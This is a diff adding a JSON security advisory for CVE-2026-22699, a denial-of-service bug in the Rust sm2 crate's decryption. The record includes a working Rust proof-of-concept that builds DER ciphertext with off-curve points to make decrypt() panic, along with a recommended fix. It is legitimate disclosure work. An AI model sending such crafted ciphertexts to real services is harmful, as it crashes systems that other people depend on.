@@ -1,0 +1,53 @@
+{
+  "id": "GHSA-78p6-6878-8mj6",
+  "modified": "2026-01-09T23:11:23.263385Z",
+  "published": "2026-01-09T22:35:35Z",
+  "aliases": [
+    "CVE-2026-22699"
+  ],
+  "summary": "SM2-PKE has Unchecked AffinePoint Decoding (unwrap) in decrypt()",
+  "details": "### Summary\n\nA denial-of-service vulnerability exists in the SM2 PKE decryption path where an invalid elliptic-curve point (C1) is decoded and the resulting value is unwrapped without checking. Specifically, `AffinePoint::from_encoded_point(\u0026encoded_c1)` may return a `None`/`CtOption::None` when the supplied coordinates are syntactically valid but do not lie on the SM2 curve. The calling code previously used `.unwrap()`, causing a panic when presented with such input.\n\n\n\n\n### Affected Component / Versions\n\n- File: `src/pke/decrypting.rs`\n\n- Function: internal `decrypt()` (invoked by `DecryptingKey::decrypt*` methods)\n\n- Affected releases: \n\n  - sm2 0.14.0-rc.0 (https://crates.io/crates/sm2/0.14.0-rc.0)\n  - sm2 0.14.0-pre.0 (https://crates.io/crates/sm2/0.14.0-pre.0)\n\n  \n\n\n### Details\n\nThe library decodes the C1 field (an EC point) as an `EncodedPoint` and then converts it to an `AffinePoint` using `AffinePoint::from_encoded_point(\u0026encoded_c1)`. That conversion returns a `CtOption\u003cAffinePoint\u003e` (or an `Option` equivalent) which will indicate failure when the coordinates do not satisfy the curve equation. The code then called `.unwrap()` on that result, causing a panic when\n`None` was returned. Because `EncodedPoint::from_bytes()` only validates format (length and SEC1\nencoding) and not mathematical validity, an attacker can craft `C1 = 0x04 || X || Y` with X and Y of the right length that nonetheless do not satisfy the curve. Such inputs will pass the format check but trigger `from_encoded_point()` failure and therefore panic on `.unwrap()`.\n\n\n\n\n### Proof of Concept (PoC)\n\n`examples/poc_der_invalid_point.rs` constructs an ASN.1 DER `Cipher` structure\nwith `x` and `y` set to arbitrary 32-byte values (e.g., repeating 0x11 and 0x22),\nand passes it to `DecryptingKey::decrypt_der`. With the vulnerable code, this\nproduces a panic originating at the `unwrap()` call in `decrypt()`. Other APIs such as `DecryptingKey::decrypt` also produce a panic with invalid C1 point.\n\n``` rust\n//! PoC: trigger invalid-point panic via `decrypt_der` by providing ASN.1 DER\n//! where x/y are valid-length integers but do not lie on the curve.\n//!\n//! Usage:\n//!   RUST_BACKTRACE=1 cargo run --example poc_der_invalid_point\n\nuse rand_core::OsRng;\nuse sm2::SecretKey;\nuse sm2::pke::DecryptingKey;\n\nfn build_der(x: \u0026[u8], y: \u0026[u8], digest: \u0026[u8], cipher: \u0026[u8]) -\u003e Vec\u003cu8\u003e {\n    // Build SEQUENCE { INTEGER x, INTEGER y, OCTET STRING digest, OCTET STRING cipher }\n    let mut body = Vec::new();\n\n    // INTEGER x\n    body.push(0x02);\n    body.push(x.len() as u8);\n    body.extend_from_slice(x);\n\n    // INTEGER y\n    body.push(0x02);\n    body.push(y.len() as u8);\n    body.extend_from_slice(y);\n\n    // OCTET STRING digest\n    body.push(0x04);\n    body.push(digest.len() as u8);\n    body.extend_from_slice(digest);\n\n    // OCTET STRING cipher\n    body.push(0x04);\n    body.push(cipher.len() as u8);\n    body.extend_from_slice(cipher);\n\n    // SEQUENCE header\n    let mut der = Vec::new();\n    der.push(0x30);\n    der.push(body.len() as u8);\n    der.extend(body);\n    der\n}\n\nfn main() {\n    let mut rng = OsRng;\n    let sk = SecretKey::try_from_rng(\u0026mut rng).expect(\"failed to generate secret key\");\n    let dk = DecryptingKey::new(sk);\n\n    // x/y are 32-byte values that almost certainly are NOT on the curve\n    let x = [0x11u8; 32];\n    let y = [0x22u8; 32];\n    let digest = [0x33u8; 32];\n    let cipher = [0x44u8; 16];\n\n    let der = build_der(\u0026x, \u0026y, \u0026digest, \u0026cipher);\n\n    println!(\"Calling decrypt_der with DER (len={})...\", der.len());\n\n    // Expected to panic in decrypt() when validating the point (from_encoded_point().unwrap())\n    let _ = dk.decrypt_der(\u0026der);\n\n    println!(\"decrypt_der returned (unexpected) - PoC did not panic\");\n}\n\n```\n\nRun locally:\n\n```bash\nRUST_BACKTRACE=1 cargo run --example poc_der_invalid_point --features std\n```\n\nThe process will panic with a backtrace pointing to `src/pke/decrypting.rs` at the `from_encoded_point(...).unwrap()` call.\n\n\n\n\n### Impact\n\n- Denial of Service: an attacker who can submit ciphertext (or DER ciphertext)\n  can crash the decrypting thread/process.\n- Low attacker effort: crafting random 32-byte X/Y values that are not on the\n  curve is trivial.\n- Wide exposure: any service that accepts ciphertext and links this library is\n  vulnerable.\n\n\n### Recommended Fix\n\nDo not call `.unwrap()` on the result of `AffinePoint::from_encoded_point()`.\nInstead, convert the `CtOption` to an `Option` (or inspect it) and return a\nlibrary `Err` for invalid points. Example minimal fix:\n\n```rust\n    // Return an error instead of panicking when the provided point is not on the curve.\n    let mut c1_point: AffinePoint = match AffinePoint::from_encoded_point(\u0026encoded_c1).into() {\n        Some(p) =\u003e p,\n        None =\u003e return Err(Error),\n    };\n```\n\nThis ensures `decrypt()` returns a controlled error for invalid or malformed points instead of panicking.\n\n\n\n### **Credit**\n\nThis vulnerability was discovered by:\n\n- XlabAI Team of Tencent Xuanwu Lab\n\n- Atuin Automated Vulnerability Discovery Engine\n\nCVE and credit are preferred.\n\nIf developers have any questions regarding the vulnerability details, please feel free to reach for further discussion via email at xlabai@tencent.com.\n\n \n\n### **Note**\n\nThis organization follows the security industry standard disclosure policy—the 90+30 policy (reference: https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html). If the aforementioned vulnerabilities cannot be fixed within 90 days of submission, we reserve the right to publicly disclose all information about the issues after this timeframe.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "sm2",
+        "purl": "pkg:cargo/sm2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.14.0-pre.0"
+            },
+            {
+              "last_affected": "0.14.0-rc.4"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-78p6-6878-8mj6/GHSA-78p6-6878-8mj6.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/RustCrypto/elliptic-curves/security/advisories/GHSA-78p6-6878-8mj6"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/RustCrypto/elliptic-curves/pull/1602"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/RustCrypto/elliptic-curves/commit/085b7bee647029bd189e1375203418205006bcab"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/RustCrypto/elliptic-curves"
+    }
+  ]
+}
